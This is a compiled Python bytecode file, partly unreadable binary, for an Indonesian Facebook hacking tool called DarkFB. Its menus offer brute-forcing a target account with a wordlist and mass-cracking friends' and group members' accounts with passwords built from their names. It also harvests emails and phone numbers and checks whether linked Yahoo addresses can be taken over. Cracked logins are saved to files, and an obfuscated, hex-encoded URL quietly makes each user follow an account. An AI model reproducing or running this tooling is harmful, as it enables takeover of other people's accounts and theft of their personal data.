ó
¹3]c           @   s!   d  d l  Z  e  j d  d Ud S(   iÿÿÿÿNsB c           @   s5  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l Z d  d l Z d  d l m Z d  d l m Z d  d l m Z e  j d  j   j   Z e e  e j d  e j   Z e j e  e j e j j   d d dK g e _  d   Z! d   Z" e# d d  j   j   Z$ e j% e j& e j' d    j( j   Z) d e$ d Z* d   Z+ d   Z, d   Z- d a. g  Z/ g  a0 g  a1 g  a2 g  Z3 g  Z4 g  Z5 g  Z6 g  Z7 g  Z8 g  Z9 g  Z: g  Z; g  Z< g  Z= g  Z> g  Z? d Z@ d ZA d   ZB d   ZC d   ZD d   ZE d   ZF d   ZG d   ZH d   ZI d    ZJ d!   ZK d"   ZL d#   ZM d$   ZN d%   ZO d&   ZP d'   ZQ d(   ZR d)   ZS d*   ZT d+   ZU d,   ZV d-   ZW d.   ZX d/   ZY d0   ZZ d1   Z[ d2   Z\ d3   Z] d4   Z^ d5   Z_ d6   Z` d7   Za d8   Zb d9   Zc d:   Zd d;   Ze d<   Zf d=   Zg d>   Zh d?   Zi d@   Zj dA   Zk dB   Zl dC   Zm dD   Zn dE   Zo dF   Zp dG   Zq dH   Zr es dI  Zt eu dJ k r1e-   eC   n  d S(L   iÿÿÿÿN(   t
   ThreadPool(   t   ConnectionError(   t   Browsers   getprop ro.product.modelt   utf8t   max_timei   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16c           C   s   d GHt  j j   d  S(   Ns   [1;91m[!] Keluar(   t   ost   syst   exit(    (    (    t    t   keluar   s    c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g{®Gáz?(   R   t   stdoutt   writet   flusht   timet   sleep(   t   zt   e(    (    R   t   jalan   s    s   version.txtt   rt   789CCB28292928B6D2D74FCF2CC9284DD24BCECFD5F74A4DCD2976CACF4FAAD277492CCA7673D22F4A2CD7CF4D2C2E492DD22F4B2D2ACECCCFD32BA92801008AC0160As    [1;97mâââââââââ
 [1;97mâââââââââ         [1;96mââ¬â¬â¬â¬â¬â¬â¬â¬â¬à¹Û©Û©à¹â¬â¬â¬â¬â¬â¬â¬â¬â
 [1;97mâ [1;91mâ¼â¼â¼â¼â¼  [1;97m- _ --_-- [1;92mââ¦âââââ¬âââ¬ââ   âââââ 
 [1;97mâ  [1;97m  [1;97m_-_-- -_ --__ [1;92m âââââ¤ââ¬âââ´âââââ â£ â â©â
 [1;97mâ [1;91mâ²â²â²â²â² [1;97m--  - _ -- [1;92mââ©ââ´ â´â´âââ´ â´   â  âââ  [1;93mPremium
 [1;97mâââââââââ         [1;96mÂ«----------â§----------Â»
 [1;97m ââ ââ
 [1;97mââââââââââââââââââââââââââââââââââââââââââââââââââ
 [1;97mâ [1;93m*  [1;97mReCode   [1;91m:  [1;96m JeelsBoobz  [1;97m                   â
 [1;97mâ [1;93m*  [1;97mGitHub   [1;91m:   [1;92mhttps://github.com/JeelsBoobz[0m  [1;97mâ
 [1;97mâ [1;93m*  [1;97mVersion  [1;91m:   [1;92msÇ                           [0m  [1;97mâ
 [1;97mââââââââââââââââââââââââââââââââââââââââââââââââââc           C   s?   t  j d d  t j d d  k  r5 d t d a n d a d  S(   Nt   .R   s   Update (t   )t   Update(   t	   c_versiont   replacet	   l_versiont   updt(    (    (    R   t   check_version   s    $c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s-   [1;91m[â] [1;92mSedang Masuk COK [1;97mi   (   R   R
   R   R   R   (   t   titikt   o(    (    R   t   tik&   s
    c          C   s   t  j d  j   j   }  t j t j d   j   } t j t j d   j   } |  | | g k r d GHt d  t	   n  d  S(   Ns"   git config --get remote.origin.urlt^   789CCB28292928B6D2D74FCF2CC9284DD24BCECFD5F74A4DCD2976CACF4FAAD277492CCA7673D2034A02002D680E85tX   789CCB28292928B6D2D74FCF2CC9284DD24BCECFD5F74A4DCD2976CACF4FAAD277492CCA76730200F5DA0D13s    [1;91m[!] Tools ini tidak resmis   
[1;91m[ [1;97mBack [1;91m](
   R   t   popent   readt   stript   zlibt
   decompresst   base64t	   b16decodet	   raw_inputR	   (   t   get_repot   my_repot   my_repo2(    (    R   t   check_official.   s    
i    s   [31mNot Vulns	   [32mVulnc           C   sH   t  2t 2t 2t 2t 2t 2t 2t 2t 2t	 2t
 2t 2t 2t 2t 2t 2t 2d  S(   N(   t   threadst   berhasilt   cekpointt   gagalt   idtemant   idfromtemant   idmemt   idt   emt   emfromtemant   hpt   hpfromtemant   reaksit
   reaksigrupt   koment	   komengrupt   listgrup(    (    (    R   t   reset_arrayL   s"    c          C   s°  t  j d  y t d d  }  t   Wnt t f k
 r«t  j d  t GHd d GHd GHt d  } t j d  } t	   y t
 j d	  Wn  t j k
 r² d
 GHt   n Xt t
 j _ t
 j d d  | t
 j d <| t
 j d <t
 j   t
 j   } d | k rMyd | d | d } i d d 6d d 6| d 6d d 6d d 6d d 6d d 6d d 6| d 6d  d! 6d" d# 6} t j d$  } | j |  | j   } | j i | d% 6 d& } t j | d' | } t j | j  }	 t d d(  }
 |
 j |	 d)  |
 j   d* GHt  j! d+  t   WqMt j" j# k
 rId
 GHt   qMXn  d, | k rd- GHt  j d.  t  j! d/  t   q¬d0 GHt  j d.  t  j! d/  t$   n Xd  S(1   Nt   clears	   login.txtR   i4   s
   [1;97mâs<   [1;91m[â] [1;92mLOGIN AKUN FACEBOOK AKUN FB [1;91m[â]s.   [1;91m[+] [1;36mUsername FB [1;91m:[1;92m s.   [1;91m[+] [1;36mPassword FB [1;91m:[1;92m s   https://m.facebook.coms   
[1;91m[!] Tidak ada koneksit   nri    t   emailt   passs   save-devicesG   api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`   format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s;   return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32t    882a8490361da98702bf97a021ddc14dt   api_keyt   passwordt   credentials_typet   JSONt   formatt   1t   generate_machine_idt   generate_session_cookiest   en_USt   locales
   auth.logint   methodt   0t   return_ssl_resourcess   1.0t   vt   md5t   sigs'   https://api.facebook.com/restserver.phpt   paramst   wt   access_tokens1   
[1;91m[[1;96mâ[1;91m] [1;92mLogin berhasili   t
   checkpoints'   
[1;91m[!] [1;93mAkun kena Checkpoints   rm -rf login.txti   s   
[1;91m[!] Login Gagal(%   R   t   systemt   opent   menut   KeyErrort   IOErrort   logoR(   t   getpassR   t   brt	   mechanizet   URLErrorR	   t   Truet   _factoryt   is_htmlt   select_formt   formt   submitt   geturlt   hashlibt   newt   updatet	   hexdigestt   requestst   gett   jsont   loadst   textR   t   closeR   R   t
   exceptionsR   t   login(   t   toketR4   t   pwdt   urlRS   t   datat   xt   aR   R   t   zedd(    (    R   Rt   _   sh    	
S

c    
      C   so  t  j d  y t d d  j   }  WnD t k
 rl t  j d  d GHt  j d  t j d  t   nà Xyv t j	 d |   } t
 j | j  } | d } | d	 } t j	 d
 |   } t
 j | j  } t | d d  } Wnf t k
 r)t  j d  d GHt  j d  t j d  t   n# t j j k
 rKd GHt   n Xt  j d  t   t j	 t j t j d    j j   } x' | D] }	 t j d |	 d |   qWt GHd d d d GHd | d t |  d d GHd | d t |  d d GHd | d t |  d d GHd d d d GHd GHd GHd  GHd! GHd" t GHd# GHd$ GHd% GHt   d  S(&   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   s+   https://graph.facebook.com/me?access_token=t   nameR4   s7   https://graph.facebook.com/me/subscribers?access_token=t   summaryt   total_counts1   [1;91m[!] [1;93mSepertinya akun kena Checkpoints   [1;91m[!] Tidak ada koneksitj   789CCB28292928B6D2D72FC9CFCF29D64BCEC92F4D494C4E4E2D2ED6CBC82F2ED14F4CC9CDCCCB4C894F4BD22BA92801008C66115As   https://graph.facebook.com/s   /subscribers?access_token=s
   [1;97mâi2   s   âs   âs:   â[1;91m[[1;96mâ[1;91m][1;97m Name [1;91m: [1;92mi'   s   [1;97m s   âs:   â[1;91m[[1;96mâ[1;91m][1;97m FBID [1;91m: [1;92ms:   â[1;91m[[1;96mâ[1;91m][1;97m Subs [1;91m: [1;92ms
   [1;97mâ s   âs%   â-> [1;37;40m1. Informasi Penggunas%   â-> [1;37;40m2. Hack Akun Facebooks   â-> [1;37;40m3. Bots   â-> [1;37;40m4. Lainnyas   â-> [1;37;40m5. s   â-> [1;37;40m6. Logouts   â-> [1;31;40m0. Keluars
   [1;97mâ(   R   RX   RY   R"   R\   R   R   Rt   Rm   Rn   Ro   Rp   Rq   t   strR[   Rs   R   R	   R   R$   R%   R&   R'   t
   splitlinest   postR]   t   lenR   t   pilih(
   Ru   t   otwRz   t   namaR4   t   otst   bt   subt   admlt   adm(    (    R   RZ      s\    


*	c          C   s  t  d  }  |  d k r' d GHt   nó |  d k r= t   nÝ |  d k rS t   nÇ |  d k ri t   n± |  d k r t   n |  d k rÍ t j d	  t GHd
 d GHt j d  t  d  t j d  nM |  d k rð t j d  t	   n* |  d k rt	   n d |  d GHt   d  S(   Ns   [1;97mââ[1;91mâ©[1;97m R   s   [1;91m[!] Jangan kosongRI   t   2t   3t   4t   5R?   i4   s
   [1;97mâs   git pull origin masters   
[1;91m[ [1;97mBack [1;91m]s   python2 DarkFB.pyt   6s   rm -rf login.txtRO   s   [1;91m[â] [1;97ms    [1;91mTidak ada(
   R(   R   t	   informasit	   menu_hackt   menu_bott   lainR   RX   R]   R	   (   R{   (    (    R   R   Ë   s4    




	


c          C   s³  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd d GHt	 d	  } t
 d
  t j d |   } t j | j  } xö| d D]Ô} | | d k sç | | d k rÁ t j d | d d |   } t j | j  } d d GHy d | d GHWn t k
 rJd GHn7Xy d | d GHWn t k
 rtd GHn­ Xy d | d GHWn t k
 rd GHnY Xy d | d GHWn t k
 rÈd GHn Xy d | d d GHWn t k
 röd GHn Xy d | d GHWn t k
 r d  GHn XyL d! GHx@ | d" D]4 } y d# | d$ d GHWq4t k
 rgd% GHq4Xq4WWn t k
 rn Xt	 d&  t   qÁ qÁ Wd' GHt	 d&  t   d  S((   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâs@   [1;91m[+] [1;92mMasukan ID[1;97m/[1;92mNama[1;91m : [1;97ms.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...s3   https://graph.facebook.com/me/friends?access_token=Rx   R|   R4   s   https://graph.facebook.com/s   ?access_token=s+   [1;91m[â¹] [1;92mNama[1;97m          : s9   [1;91m[?] [1;92mNama[1;97m          : [1;91mTidak adas+   [1;91m[â¹] [1;92mID[1;97m            : s9   [1;91m[?] [1;92mID[1;97m            : [1;91mTidak adas+   [1;91m[â¹] [1;92mEmail[1;97m         : RA   s9   [1;91m[?] [1;92mEmail[1;97m         : [1;91mTidak adas+   [1;91m[â¹] [1;92mNomor HP[1;97m      : t   mobile_phones9   [1;91m[?] [1;92mNomor HP[1;97m      : [1;91mTidak adas+   [1;91m[â¹] [1;92mLokasi[1;97m        : t   locations9   [1;91m[?] [1;92mLokasi[1;97m        : [1;91mTidak adas+   [1;91m[â¹] [1;92mTanggal Lahir[1;97m : t   birthdays9   [1;91m[?] [1;92mTanggal Lahir[1;97m : [1;91mTidak adas+   [1;91m[â¹] [1;92mSekolah[1;97m       : t	   educations#   [1;91m                   ~ [1;97mt   schools,   [1;91m                   ~ [1;91mTidak adas!   
[1;91m[ [1;97mKembali [1;91m]s%   [1;91m[â] Pengguna tidak ditemukan(   R   RX   RY   R"   R\   R   R   Rt   R]   R(   R   Rm   Rn   Ro   Rp   Rq   R[   RZ   (   Ru   R4   R   t   cokt   pR   t   q(    (    R   R   ñ   st    	
 							

c          C   s®   t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd d GHd	 GHd
 GHd GHd GHd GHd GHd GHd GHt	   d  S(   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâs;   â-> [1;37;40m1. Mini Hack Facebook([1;92mTarget[1;97m)s,   â-> [1;37;40m2. Multi Bruteforce Facebooks2   â-> [1;37;40m3. Super Multi Bruteforce Facebooks3   â-> [1;37;40m4. BruteForce([1;92mTarget[1;97m)s    â-> [1;37;40m5. Yahoo Checkers$   â-> [1;37;40m6. Ambil id/email/hps   â-> [1;31;40m0. Kembalis
   [1;97mâ(
   R   RX   RY   R"   R\   R   R   Rt   R]   t
   hack_pilih(   Ru   (    (    R   R   8  s(    	c          C   sà   t  d  }  |  d k r' d GHt   nµ |  d k r= t   n |  d k rZ t   t   n |  d k rp t   nl |  d k r t   nV |  d k r t   n@ |  d	 k r² t   n* |  d
 k rÈ t	   n d |  d GHt   d  S(   Ns   [1;97mââ[1;91mâ©[1;97m R   s   [1;91m[!] Jangan kosongRI   R   R   R   R   R   RO   s   [1;91m[â] [1;97ms    [1;91mTidak ada(
   R(   R   t   minit   crackt   hasilt   supert   brutet
   menu_yahoot   grabRZ   (   t   hack(    (    R   R   P  s*    







c          C   s   t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n=Xt  j d  t GHd d GHd	 GHyòt	 d
  } t
 d  t j d | d |   } t j | j  } d | d GHt
 d  t j d  t
 d  t j d  t
 d  d d GH| d d } t j d | d | d  } t j |  } d | k rd GHd | d GHd | GHd | GHt	 d  t   nÝd | d  k rád GHd! GHd | d GHd | GHd | GHt	 d  t   n| d d" } t j d | d | d  } t j |  } d | k rad GHd | d GHd | GHd | GHt	 d  t   nd | d  k r®d GHd! GHd | d GHd | GHd | GHt	 d  t   nÃ| d# d } t j d | d | d  } t j |  } d | k r.d GHd | d GHd | GHd | GHt	 d  t   nCd | d  k r{d GHd! GHd | d GHd | GHd | GHt	 d  t   nö | d$ }	 |	 j d% d&  }
 t j d | d |
 d  } t j |  } d | k r	d GHd | d GHd | GHd |
 GHt	 d  t   nh d | d  k rVd GHd! GHd | d GHd | GHd |
 GHt	 d  t   n d' GHd( GHt	 d  t   Wn' t k
 rd) GHt	 d  t   n Xd  S(*   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâsB   [1;91m[ INFO ] Akun target harus berteman dengan akun anda dulu !s,   [1;91m[+] [1;92mID Target [1;91m:[1;97m s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...s   https://graph.facebook.com/s   ?access_token=s"   [1;91m[â¹] [1;92mNama[1;97m : R|   s&   [1;91m[+] [1;92mMemeriksa [1;97m...i   s-   [1;91m[+] [1;92mMembuka keamanan [1;97m...s4   [1;91m[âº] [1;92mMohon Tunggu sebentar [1;97m...t
   first_namet   123s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RV   s   [1;91m[+] [1;92mDitemukan.s4   [1;91m[[1;96mâ[1;91m] [1;92mNama[1;97m     : s&   [1;91m[â¹] [1;92mUsername[1;97m : s&   [1;91m[â¹] [1;92mPassword[1;97m : s!   
[1;91m[ [1;97mKembali [1;91m]s   www.facebook.comt	   error_msgs&   [1;91m[!] [1;93mAkun kena Checkpointt   12345t	   last_nameR   t   /R   s1   [1;91m[!] Maaf, gagal membuka password target :(s$   [1;91m[!] Cobalah dengan cara lain.s!   [1;91m[!] Terget tidak ditemukan(   R   RX   RY   R"   R\   R   R   Rt   R]   R(   R   Rm   Rn   Ro   Rp   Rq   t   urllibt   urlopent   loadR   R   R[   (   Ru   R4   R   Rz   t   pz1Rx   t   yt   pz2t   pz3t   lahirt   pz4(    (    R   R   p  sÒ    	



			

		

		

		

		

		


		

		



c          C   s?  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   nÜ Xt  j d  t GHd d GHt	 d	  a
 t	 d
  a y~ t t
 d  a t d  xC t d  D]5 } t j d t d d  } | j   t j |  q¼ Wx t D] } | j   qü WWn' t k
 r:d GHt	 d  t   n Xd  S(   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâs+   [1;91m[+] [1;92mFile ID  [1;91m: [1;97ms+   [1;91m[+] [1;92mPassword [1;91m: [1;97ms.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...i(   t   targett   argss   [1;91m[!] File tidak ditemukans!   
[1;91m[ [1;97mKembali [1;91m](    (   R   RX   RY   R"   R\   R   R   Rt   R]   R(   t   idlistt   passwt   fileR   t   ranget	   threadingt   Threadt   scrakt   startR-   t   appendt   joinR   (   Ru   Ry   R{   (    (    R   R   å  s4    	


c          C   s  yÔt  t d  }  |  j   j   a x¬t rÒt j   j   } d | d t d } t	 j
 |  } t j |  } t t t  k r Pn  d | k rí t  d d  } | j | d t d	  | j   t j d
 | d t  t d 7a n d | d k rUt  d d  } | j | d t d	  | j   t j d | d t  t d 7a n t j |  t d 7a t j j d t t  d t t t   d t t t   d t t t    t j j   q' WWn> t k
 rùd GHt j d  n t j j k
 rd GHn Xd  S(   NR   s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RV   s   Berhasil.txtRU   s    | s   
s   [1;97m[[1;92mð[1;97m] i   s   www.facebook.comR¨   s   Cekpoint.txts   [1;97m[[1;93mð[1;97m] s<   [1;91m[[1;96mâ¸[1;91m] [1;92mCrack    [1;91m:[1;97m s    [1;96m>[1;97m s    =>[1;92mLive[1;91m:[1;96ms%    [1;97m=>[1;93mCheck[1;91m:[1;96ms   
[1;91m[!] Koneksi terganggus   [1;91m[â] Tidak ada koneksi(   RY   R·   R"   t   splitt   upR¹   t   readlineR#   R¸   R¬   R­   Ro   R®   t   backR   R   Rr   R.   R¿   R/   R0   R   R
   R   R   R\   R   R   Rm   Rs   R   (   t   bukat   usernameRw   Rx   t   mpsht   bisat   cek(    (    R   R½     s>    	


Vc          C   sW   Hd d GHx t  D] }  |  GHq Wx t D] } | GHq' WHd t t t   GHt   d  S(   Ni4   s
   [1;97mâs   [31m[x] Gagal [1;97m--> (   R.   R/   R   R   R0   R	   (   R   t   c(    (    R   R    2  s    			c           C   s   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHd d GHd	 GHd
 GHd GHd GHd GHt
   d  S(   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâs#   â-> [1;37;40m1. Crack dari Temans"   â-> [1;37;40m2. Crack dari Grups"   â-> [1;37;40m3. Crack dari Files   â-> [1;31;40m0. Kembalis
   [1;97mâ(   R   RX   RY   R"   Ru   R\   R   R   Rt   R]   t   pilih_super(    (    (    R   R¡   @  s"    	c          C   s  t  d  }  |  d k r' d GHt   nF|  d k r­ t j d  t   t GHd d GHt d  t j d	 t	  } t
 j | j  } xæ| d
 D] } t j | d  q WnÀ|  d k r¥t j d  t   t GHd d GHt  d  } y> t j d | d t	  } t
 j | j  } d | d GHWn' t k
 rNd GHt  d  t   n Xt j d | d t	  } t
 j | j  } xî | d
 D] } t j | d  qWnÈ |  d k rCt j d  t   t GHd d GHyC t  d  } x0 t | d  j   j   D] }	 t j |	  qþWWqmt k
 r?d GHt  d  t   qmXn* |  d k rYt   n d |  d GHt   d t t t   GHt d  d  d! d" g }
 x0 |
 D]( } d# | Gt j j   t j d$  q¢WHd d GHd%   } t d&  } | j | t  d' GHt  d  t   d  S((   Ns   [1;97mââ[1;91mâ©[1;97m R   s   [1;91m[!] Jangan kosongRI   R?   i4   s
   [1;97mâs/   [1;91m[+] [1;92mMengambil id teman [1;97m...s3   https://graph.facebook.com/me/friends?access_token=Rx   R4   R   s,   [1;91m[+] [1;92mID Grup   [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s<   [1;91m[[1;96mâ[1;91m] [1;92mNama grup [1;91m:[1;97m R|   s   [1;91m[!] Grup tidak ditemukans!   
[1;91m[ [1;97mKembali [1;91m]s   https://graph.facebook.com/s5   /members?fields=name,id&limit=999999999&access_token=R   s+   [1;91m[+] [1;92mFile ID  [1;91m: [1;97mR   s   [1;91m[!] File not founds   
[1;91m[ [1;97mBack [1;91m]RO   s   [1;91m[â] [1;97ms    [1;91mTidak adas,   [1;91m[+] [1;92mJumlah ID [1;91m: [1;97ms.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...s   .   s   ..  s   ... s1   [1;91m[[1;96mâ¸[1;91m] [1;92mCrack [1;97mi   c         S   sW  |  } yCt  j d | d t  } t j | j  } | d d } t j d | d | d  } t j |  } d | k rê t  j t	 j
 t j d	    j j   } x+ | D]# } t  j d | d
 | d  q¯ Wd | d | GHn^d | d k rd | d | GHn:| d d }	 t j d | d |	 d  } t j |  } d | k rÂt  j t	 j
 t j d	    j j   } x+ | D]# } t  j d | d
 | d  qWd | d |	 GHnd | d k ræd | d |	 GHnb| d d }
 t j d | d |
 d  } t j |  } d | k rt  j t	 j
 t j d	    j j   } x+ | D]# } t  j d | d
 | d  q_Wd | d |
 GHn®d | d k r¾d | d |
 GHn| d } | j d d  } t j d | d | d  } t j |  } d | k rt  j t	 j
 t j d	    j j   } x+ | D]# } t  j d | d
 | d  qEWd | d | GHnÈd | d k r¤d | d | GHn¤t d d  j   j   } x| D]~} | d } t j d | d | d  } t j |  } d | k r|t  j t	 j
 t j d	    j j   } x+ | D]# } t  j d | d
 | d  qAWd | d | GHqÆd | d k r d | d | GHqÆ| d } t j d | d | d  } t j |  } d | k rPt  j t	 j
 t j d	    j j   } x+ | D]# } t  j d | d
 | d  qWd | d | GHqÆd | d k rtd | d | GHqÆ| } t j d | d | d  } t j |  } d | k r t  j t	 j
 t j d	    j j   } x+ | D]# } t  j d | d
 | d  qåWd | d | GHqÆd | d k rÆd | d | GHqÆqÆWWn n Xd  S(   Ns   https://graph.facebook.com/s   /?access_token=R¦   R§   s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RV   R   s   /subscribers?access_token=s   [1;97m[[1;92mð[1;97m] s    | s   www.facebook.comR¨   s   [1;97m[[1;93mð[1;97m] R©   Rª   R   R«   R   s   password.binR   (   Rm   Rn   Ru   Ro   Rp   Rq   R¬   R­   R®   R$   R%   R&   R'   R   R   R   RY   R"   (   t   argt   userRz   R   t   pass1Rx   R   R   R   t   pass2t   pass3R³   t   pass4t   arpt   ckpt   pass5t   pass6t   pass7(    (    R   t   main  s    *!*!*!
*!
*!
*!*!i   s   
[1;91m[+] [1;97mSelesai(   R(   RË   R   RX   R>   R]   R   Rm   Rn   Ru   Ro   Rp   Rq   R4   R¿   R[   R¡   RY   R"   R   R\   R   R   R   R   R
   R   R   R   R    t   map(   t   peakR   R   t   st   idgt   aswt   ret   iR·   t   lineR   R   R×   R   (    (    R   RË   V  s    
	
	
	"


		_
c    
      C   s  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n:Xt  j d  t GHd d GHyùt	 d	  } t	 d
  } t | d  } | j
   } d d GHd | GHd t t |   d GHt d  t | d  } x{| D]s} yA| j d d  } t j j d |  t j j   t j d | d | d  } t j | j  } d | k rÑt d d  } | j | d | d  | j   d GHd d GHd | GHd | GHt   nq d | d k rBt d d  }	 |	 j | d | d  |	 j   d GHd d GHd GHd | GHd | GHt   n  Wqü t j j k
 rnd  GHt j d  qü Xqü WWn" t k
 rd! GHd" GHt   n Xd  S(#   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâsX   [1;91m[+] [1;92mID[1;97m/[1;92mEmail[1;97m/[1;92mHp [1;97mTarget [1;91m:[1;97m s@   [1;91m[+] [1;92mWordlist [1;97mext(list.txt) [1;91m: [1;97ms9   [1;91m[[1;96mâ[1;91m] [1;92mTarget [1;91m:[1;97m s    [1;91m[+] [1;92mJumlah[1;96m s    [1;92mPasswords.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...s   
R   s2   [1;91m[[1;96mâ¸[1;91m] [1;92mMencoba [1;97ms   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RV   s	   Brute.txtRU   s    | s   
[1;91m[+] [1;92mDitemukan.s-   [1;91m[â¹] [1;92mUsername [1;91m:[1;97m s-   [1;91m[â¹] [1;92mPassword [1;91m:[1;97m s   www.facebook.comR¨   s   Brutecekpoint.txts&   [1;91m[!] [1;93mAkun kena Checkpoints   [1;91m[!] Koneksi Errors"   [1;91m[!] File tidak ditemukan...s:   
[1;91m[!] [1;92mSepertinya kamu tidak memiliki wordlist(   R   RX   RY   R"   R\   R   R   Rt   R]   R(   t	   readlinesR   R   R   R   R   R
   R   R   Rm   Rn   Ro   Rp   Rq   Rr   R	   Rs   R   t   tanyaw(
   Ru   RA   R¸   t   totalt   sandit   pwRx   RÇ   t   dapatt   ceks(    (    R   R¢     sl    			

			

			c          C   s   t  d  }  |  d k r' d GHt   nd |  d k r= t   nN |  d k rS t   n8 |  d k ri t   n" |  d k r t   n d GHt   d  S(   NsG   [1;91m[?] [1;92mIngin membuat wordlist ? [1;92m[y/t][1;91m:[1;97m R   s$   [1;91m[!] Tolong pilih [1;97m(y/t)R°   t   Yt   tt   T(   R(   Rá   t   wordlistR   (   t   why(    (    R   Rá   >  s    




c          C   s   t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd d GHd	 GHd
 GHd GHd GHt	   d  S(   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâs&   â-> [1;37;40m1. Dari teman facebooks   â-> [1;37;40m2. Gunakan Files   â-> [1;31;40m0. Kembalis
   [1;97mâ(
   R   RX   RY   R"   R\   R   R   Rt   R]   t   yahoo_pilih(   Ru   (    (    R   R£   T  s     	c          C   s   t  d  }  |  d k r' d GHt   nV |  d k r= t   n@ |  d k rS t   n* |  d k ri t   n d |  d GHt   d  S(	   Ns   [1;97mââ[1;91mâ©[1;97m R   s   [1;91m[!] Jangan kosongRI   R   RO   s   [1;91m[â] [1;97ms    [1;91mTidak ada(   R(   Rì   t   yahoofriendst	   yahoolistR   (   t   go(    (    R   Rì   h  s    



c          C   s¶  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd d GHg  } d	 } t	 d
  t
 j d |   } t j | j  } t d d  } d d GHx¼| d D]°} | d 7} | j |  | d } | d } t
 j d | d |   }	 t j |	 j  }
 y>|
 d } t j d  } | j |  j   } d | k rtt j d  t t j _ t j d d	  | t d <t j   j   } t j d  } y | j |  j   } Wn d | d t d GHwÙ n Xd | k r\| j | d  d d GHd | GHd  | GHd! | d" t d GHd d GHqtd | d t d GHn  WqÙ t k
 rqÙ XqÙ Wd# GHd$ GH| j   t d%  t    d  S(&   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâi    s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...s3   https://graph.facebook.com/me/friends?access_token=s   MailVuln.txtRU   Rx   R4   R|   s   https://graph.facebook.com/s   ?access_token=RA   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR@   RÆ   s$   "messages.ERROR_INVALID_USERNAME">.*s*   [1;91m[â] [1;92mEmail [1;91m:[1;91m s    [1;97m[[1;92ms   [1;97m]s"   "messages.ERROR_INVALID_USERNAME">s   
s8   [1;91m[[1;96mâ[1;91m] [1;92mNama  [1;91m:[1;97m s*   [1;91m[â¹] [1;92mID    [1;91m:[1;97m s*   [1;91m[â¹] [1;92mEmail [1;91m:[1;97m s	    [[1;92ms   
[1;91m[+] [1;97mSelesais8   [1;91m[+] [1;97mTersimpan [1;91m:[1;97m MailVuln.txts!   
[1;91m[ [1;97mKembali [1;91m](!   R   RX   RY   R"   R\   R   R   Rt   R]   R   Rm   Rn   Ro   Rp   Rq   R¿   RÝ   t   compilet   searcht   groupR_   Rb   Rc   Rd   Re   Rg   t   vulnotR   t   vulnR[   Rr   R(   R£   (   Ru   RÇ   t   jmlt   temant   kimakt   saveRU   R4   R   t   linksR   t   mailt   yahooR   t   klikt   jokt   pek(    (    R   Rí   {  sp    	
	




			

c          C   st  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   nq Xt  j d  t GHd d GHt	 d	  } y t | d  } | j
   } Wn' t k
 rÏ d
 GHt	 d  t   n Xg  } d } t d  t d d  } d d GHd t d t d GHHt | d  j
   } x| D]} | j d d  } | d 7} | j |  t j d  } | j |  j   }	 d |	 k r0t j d  t t j _ t j d d  | t d <t j   j   }
